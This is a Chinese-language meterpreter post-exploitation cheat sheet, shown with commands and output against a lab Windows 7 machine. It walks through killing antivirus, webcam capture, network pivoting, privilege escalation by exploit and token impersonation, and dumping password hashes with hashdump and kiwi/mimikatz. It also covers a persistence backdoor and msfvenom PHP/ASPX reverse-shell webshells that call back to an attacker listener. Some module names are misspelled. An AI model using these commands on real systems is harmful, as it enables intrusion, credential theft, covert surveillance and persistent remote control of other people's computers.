---
title: meterpreter
---



# meterpreter

## 查看目标机进程

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name                      Arch  Session  User                          Path

---   ----  ----                      ----  -------  ----                          ----

 0     0     [System Process]                                                       
 4     0     System                    x64   0                                      
 264   4     smss.exe                  x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 316   504   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    
 348   340   csrss.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 400   340   wininit.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 412   392   csrss.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 460   392   winlogon.exe              x64   1        NT AUTHORITY\SYSTEM          C:\Windows\system32\winlogon.exe
 504   400   services.exe              x64   0        NT AUTHORITY\SYSTEM          C:\Windows\system32\services.exe
 ..................         
```

## 进程迁移

### 手动迁移

```shell
meterpreter > getpid  #查看当前进程
Current pid: 1124
meterpreter > migrate 2328  #进程迁移
[*] Migrating from 1124 to 2328...
[*] Migration completed successfully.
meterpreter > getpid #再次查看发现，确认成功迁移
Current pid: 2328
meterpreter > kill 1124 #杀死原来进程
Killing: 1124
[-] 1077: Operation failed: Access is denied.
```

### 自动迁移

```shell 
meterpreter > run post/windows/manage/migrate
```

## 信息收集

```shell
meterpreter > sysinfo #查看系统信息
Computer        : BAJI-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

meterpreter > run post/windows/gather/checkvm #检查是否运行在虚拟机上
[*] Checking if BAJI-PC is a Virtual Machine ...
[+] This is a VMware Virtual Machine

meterpreter > idletime #检查是否在运行，并查看最近运行时间
User has been idle for: 9 mins 59 secs

meterpreter > getuid  #查看已经渗透成功的用户名
Server username: baji-PC\baji

meterpreter > run post/windows/manage/killav #关闭目标机杀毒软件
[*] No target processes were found.

meterpreter > route  #查看网络设置

IPv4 network routes
===================

​    Subnet           Netmask          Gateway          Metric  Interface

------           -------          -------          ------  ---------

​    0.0.0.0          0.0.0.0          192.168.160.2    10      11
​    127.0.0.0        255.0.0.0        127.0.0.1        306     1
​    127.0.0.1        255.255.255.255  127.0.0.1        306     1
​    127.255.255.255  255.255.255.255  127.0.0.1        306     1
​    192.168.160.0    255.255.255.0    192.168.160.132  266     11
​    192.168.160.132  255.255.255.255  192.168.160.132  266     11
​    192.168.160.255  255.255.255.255  192.168.160.132  266     11
​    224.0.0.0        240.0.0.0        127.0.0.1        306     1
​    224.0.0.0        240.0.0.0        192.168.160.132  266     11
​    255.255.255.255  255.255.255.255  127.0.0.1        306     1
​    255.255.255.255  255.255.255.255  192.168.160.132  266     11

No IPv6 routes were found.

meterpreter > run post/windows/gather/enum_logged_on_users #查看当前登录用户信息
[*] Running against session 1   
Current Logged Users                                                                                               
====================                                                                                               
 SID                                             User
 ---                                             ----
 S-1-5-21-1722394881-3080478103-2565725322-1001  baji-PC\baji
[+] Results saved in: /home/zhiji/.msf4/loot/20210212153318_default_192.168.160.132_host.users.activ_894639.txt
Recently Logged Users
=====================
 SID                                             Profile Path
 ---                                             ------------
 S-1-5-18                                        %systemroot%\system32\config\systemprofile
 S-1-5-19                                        C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                        C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-1722394881-3080478103-2565725322-1001  C:\Users\baji

meterpreter > run post/windows/gather/enum_applications #查看当前运行的app应用程序
[*] Enumerating applications installed on BAJI-PC
Installed Applications
======================
 Name                                                                Version
 ----                                                                -------
 Google Chrome                                                       88.0.4324.150
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.20.27508         14.20.27508
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Mozilla Firefox 85.0.1 (x86 zh-CN)                                  85.0.1
 Mozilla Maintenance Service                                         85.0.1
 VMware Tools                                                        11.0.0.14549434
 phpstudy集成环境                                                    8.1.1.2
[+] Results stored in: /home/zhiji/.msf4/loot/20210212153406_default_192.168.160.132_host.application_671096.txt

meterpreter > run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户和密码
[*] Running against BAJI-PC on session 1
[*] The Host BAJI-PC is not configured to have AutoLogon password

meterpreter > load espia #加载Espia插件
Loading extension espia...Success.

meterpreter > screengrab #抓取当前屏幕截图
Screenshot saved to: /home/zhiji/桌面/AaCPrqTV.jpeg  #路径
meterpreter > screenshot #也可抓取当前屏幕截图
Screenshot saved to: /home/zhiji/桌面/RTEXARvH.jpeg  #路径

meterpreter > wbcam_list #查看目标机有没有摄像头
meterpreter > wbcam_snap #打开目标机摄像头并拍张照
meterpreter > wbcam_stream #开启直播模式

meterpreter > shell #进shell，exit命令退出
Process 2380 created.
Channel 2 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>
```

## 路由跳转设置

```shell
meterpreter > run get_local_subnets #查看目标机子网
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 192.168.160.0/255.255.255.0

meterpreter > run autoroute -s 192.168.160.0/24  #添加路由
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]                     [*] Adding a route to 192.168.160.0/255.255.255.0...
[+] Added route to 192.168.160.0/255.255.255.0 via 192.168.160.132                   [*] Use the -p option to list all active routes

meterpreter > run autoroute -p #查看路由是否添加成功                
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.              [!] Example: run post/multi/manage/autoroute OPTION=value [...]                    Active Routing Table                             
====================                                                                  Subnet             Netmask            Gateway
------             -------            -------
192.168.160.0      255.255.255.0      Session 1
```

## 文件命令

```shell
pwd #查看当前处于目标机的那个目录
getlwd #查看当前本地目录
ls #列出所有目录
cd #切换目录
search -f*.txt -d c:\ #搜索C盘中所有的.txt文件
download c:\aa.txt /root #下载目标机1.txt到攻击机root目录下
upload /root/1.txt c:\ #上传文件到c
```

## 提权

### 通过本地溢出漏洞提权

1、先通过getsystem命令提权，结果失败

```shell
meterpreter > getsystem
[-] 2001: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
```

2、利用WMIC命令列出已安装的补丁（这些输出的结果不能直接被利用的，使用的方式是去找提权的EXP，使用没有下列编号的EXP进行提权）

```zsh
C:\Users\baji\Desktop>Wmic qfe get Caption,Description,HotFixID,InstalledOn
Wmic qfe get Caption,Description,HotFixID,InstalledOn
Caption                                     Description  HotFixID   InstalledOn
http://support.microsoft.com/?kbid=2534111  Hotfix       KB2534111  1/4/2021
http://support.microsoft.com/?kbid=2999226  Update       KB2999226  1/4/2021
http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010       
```

3、首先把meterpreter转为后台执行，然后搜索提权的EXP漏洞，这里用MS16_032举例

```shell
seach ms16_032
use 1 #1：可用模块id
set session 1 #指定服务id
run
getuid #查看当前权限
```

### 令牌窃取提权

```shell
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u #列出可用的token
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
baji-PC\Administrator
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token baji-PC\\Administrator #冒充上面的用户登录，注意这里主机名和用户名间是两反斜杠\\
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user baji-PC\Administrator
meterpreter > shell
Process 2152 created.
Channel 2 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Users\Administrator\Desktop>whoami #查看当前用户
whoami
baji-pc\administrator

C:\Users\Administrator\Desktop>
```

## Hash攻击

### hashdump

使用hashdump抓取密码，hashdump meterpreter脚本可以从目标机提取hash值，破解hash值就可获得登录密码

```shell
meterpreter > getsystem #在上面的提权后就可以使用这一命令进一步提权了
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > hashdump #hashdump命令的执行必须要system权限，并且目标机没有开启UAC
[-] 2007: Operation failed: The parameter is incorrect.
```

面对上面的问题这里我们使用另一个更加强大的模块smart_hashdump，不仅可以导出所有用户的hash，而且可以绕过UAC

```shell
meterpreter > run windows/gather/smart_hashdump 

[*] Running module against BAJI-PC
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/zhiji/.msf4/loot/20210213214048_default_192.168.160.132_windows.hashes_515778.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY be81bb778283c994c7c2ebafd8f51b04...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[+]     baji:"1"
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:69943c5e63b4d2c104dbbcc15138b72b:::
[+]     baji:1001:aad3b435b51404eeaad3b435b51404ee:69943c5e63b4d2c104dbbcc15138b72b:::
[+]     HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:59c8c6d121b9a6b2cc21bade49bfe630:::
meterpreter > 
```

### kiwi

使用kiwi抓取密码-------旧版本的mimikatz已被该模块取代，该模块更加强大

kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。

```shell
meterpreter > getpid     #我的目标机是64位，所以先迁移一下进程
Current pid: 2336
meterpreter > migrate 2528            
[*] Migrating from 2336 to 2528...
[*] Migration completed successfully.
meterpreter > getpid    #迁移成功
Current pid: 2528

meterpreter > load mimikatz #加载mimikatz模块，这里提示我已被wiki取代请以后都用wiki(手动狗头)
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help kiwi #查看帮助
Kiwi Commands
=============
Command                Description
-------                -----------
creds_all              #列举所有凭据/所有的系统密码
creds_kerberos         #列举所有kerberos凭据
creds_msv              #列举所有msv凭据
creds_ssp              #列举所有ssp凭据
creds_tspkg            #列举所有tspkg凭据
creds_wdigest          #列举所有wdigest凭据
dcsync                 #通过DCSync检索用户帐户信息
dcsync_ntlm            #通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create   #创建黄金票据
kerberos_ticket_list   #列举kerberos票据
kerberos_ticket_purge  #清除kerberos票据
kerberos_ticket_use    #使用kerberos票据
kiwi_cmd               #kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令
lsa_dump_sam           #dump出lsa的SAM
lsa_dump_secrets       #dump出lsa的密文
password_change        #修改密码
wifi_list              #列出当前用户的wifi配置文件
wifi_list_shared       #列出共享wifi配置文件/编码
```

## 后门

### persistence后门

persistence是一款使用安装自启动方式的持久性后门程序，可以利用它创建注册和文件。启动时会触发杀毒软件，建议运行时关闭杀毒软件

```shell
run persistence -A -S -u -i 60 -P 4321 -r 192.168.160.132
A #自动启动payload程序
S #系统启动时自动加载
U #用户登录时自动启动
X #机时自动挂载
i #连时的时间间隔
P #听反向连接端口号
r #标机器IP地址
sessions #查看已经成功获取的会话
```

### web后门

1、meterpreter后门
metasploit中，有一个名为PHP Meterpreter的payload,利用该模块可以创建具有meterpreter功能PHP Webshell

使用msfvrenom工具制作webshell.php

```shell
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.160.129 -f raw > /1.php 
-p用于参与payload -f用于设置输出文件格式
```

将1.php上传到目标服务器，这里直接复制到/var/www/html目录下
接着启动msfconsole,使用以下命令设置监听

```shell
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.160.129
run
```

目标机访问http://127.0.0.1/1.php，反弹成功

2、aspx meterpreter后门
metasploit下名为shell_reverse_tcp的payload，利用这个模块可创建具有meterpreter功能的各版本webshell

```shell
show payloads
use windows/shell_reverse_tcp
info
set lhost 192.168.160.129
set lport 4444
sava
```

```zsh
generate -t asp //生成asp版的shellcode
generate -t aspx //生成aspx版的shellcode
```

先把内容保存为aspx.aspx,再上传到目标服务器，然后启动msfconsole

``` shell
use expoloit/mulit/handler
set payload windows/meterpreter/reversr_tcp
set Lhost 192.168.160.120
set lport 4444
run
```

反弹成功 